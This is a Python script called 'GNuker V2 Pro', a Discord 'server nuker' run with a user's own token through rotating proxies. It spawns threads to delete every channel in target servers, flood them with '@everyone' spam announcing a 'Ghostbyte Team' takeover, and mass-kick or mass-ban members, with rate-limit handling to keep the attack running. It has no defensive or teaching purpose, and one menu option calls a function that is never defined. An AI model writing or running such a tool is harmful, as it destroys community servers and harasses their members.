# GNuker V2 Pro - Enhanced
import requests
import threading
import time
import os
import sys
import random

SPAM_MESSAGE = "# This Server Nuked bY Ghostbyte Team\n@everyone | @here"
PROXY_FILE = "proxies.txt"
FILTER_FILE = "members.txt"


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""
░██████╗░███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
██╔════╝░████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██║░░██╗░██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║░░╚██╗██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
╚██████╔╝██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")
    print("🔵 Self Token Discord Nuker By SPYM4LE 🔵\n")

def validate_token(token):
    headers = {"Authorization": token}
    try:
        response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, proxies=get_proxy())
        return response.status_code == 200
    except:
        return False

def get_proxy():
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                proxy = random.choice(proxies)
                return {"http": proxy, "https": proxy}
    except:
        pass
    return None

def handle_rate_limit(response):
    if response.status_code == 429:
        retry_after = response.json().get("retry_after", 5)
        print(f"[RateLimit] Sleeping for {retry_after} seconds...")
        time.sleep(retry_after)
        return True
    return False

def load_filter_ids():
    if os.path.exists(FILTER_FILE):
        with open(FILTER_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip().isdigit()]
    return []

def delete_channel(channel_id, headers):
    url = f"https://discord.com/api/v10/channels/{channel_id}"
    while True:
        r = requests.delete(url, headers=headers, proxies=get_proxy())
        if handle_rate_limit(r):
            continue
        break
    if r.status_code in [200, 204]:
        print(f"🚮 Deleted channel: {channel_id}")
    else:
        print(f"⚠️ Failed to delete channel: {channel_id} (Status: {r.status_code})")

def delete_channels(guild_id, headers):
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, proxies=get_proxy())
    if r.status_code == 200:
        channels = r.json()
        for channel in channels:
            threading.Thread(target=delete_channel, args=(channel['id'], headers)).start()
    else:
        print("⚠️ Failed to fetch channels.")

def spam_channels(guild_id, headers):
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, proxies=get_proxy())
    if r.status_code == 200:
        for channel in r.json():
            def send():
                for _ in range(5):
                    data = {"content": SPAM_MESSAGE}
                    res = requests.post(f"https://discord.com/api/v10/channels/{channel['id']}/messages", headers=headers, json=data, proxies=get_proxy())
                    if handle_rate_limit(res): continue
                    print(f"[Spam] Sent in {channel['id']}")
            threading.Thread(target=send).start()

def kick_member(guild_id, user_id, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
    while True:
        r = requests.delete(url, headers=headers, proxies=get_proxy())
        if handle_rate_limit(r):
            continue
        break
    if r.status_code in [204]:
        print(f"👞 Kicked member: {user_id}")
    else:
        print(f"⚠️ Failed to kick member: {user_id} (Status: {r.status_code})")

def kick_members(guild_id, headers):
    ids = load_filter_ids()
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers, proxies=get_proxy())
    if r.status_code == 200:
        members = r.json()
        for member in members:
            uid = member['user']['id']
            if not ids or uid in ids:
                threading.Thread(target=kick_member, args=(guild_id, uid, headers)).start()
    else:
        print("⚠️ Failed to fetch members.")

def ban_member(guild_id, user_id, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}"
    while True:
        r = requests.put(url, headers=headers, proxies=get_proxy())
        if handle_rate_limit(r):
            continue
        break
    if r.status_code == 204:
        print(f"🔨 Banned member: {user_id}")
    else:
        print(f"⚠️ Failed to ban member: {user_id} (Status: {r.status_code})")

def ban_members(guild_id, headers):
    ids = load_filter_ids()
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers, proxies=get_proxy())
    if r.status_code == 200:
        members = r.json()
        for member in members:
            uid = member['user']['id']
            if not ids or uid in ids:
                threading.Thread(target=ban_member, args=(guild_id, uid, headers)).start()
    else:
        print("⚠️ Failed to fetch members.")

def main():
    clear_screen()
    banner()
    token = input("🔑 Enter your Discord token: ").strip()
    if not validate_token(token):
        print("❌ Invalid token!")
        sys.exit()
    guild_ids = input("🏛️ Enter Guild ID(s) (comma separated): ").strip().split(',')
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    while True:
        clear_screen()
        banner()
        print("""
[1] - 🚮 Delete all channels
[2] - 🛠️ Create spam channels
[3] - 🔨 Spam all channels (Ghostbyte message)
[4] - 👞 Kick filtered members
[5] - 🔨 Ban filtered members
[0] - ❌ Exit
        """)
        choice = input("Select an option: ").strip()
        if choice == "1":
            for gid in guild_ids:
                delete_channels(gid.strip(), headers)
        elif choice == "2":
            name = input("Enter channel name: ").strip()
            amount = int(input("Enter number of channels: "))
            for gid in guild_ids:
                for _ in range(amount):
                    create_channels(gid.strip(), headers, name, 1)
        elif choice == "3":
            for gid in guild_ids:
                spam_channels(gid.strip(), headers)
        elif choice == "4":
            for gid in guild_ids:
                kick_members(gid.strip(), headers)
        elif choice == "5":
            for gid in guild_ids:
                ban_members(gid.strip(), headers)
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("❌ Invalid choice!")
        input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()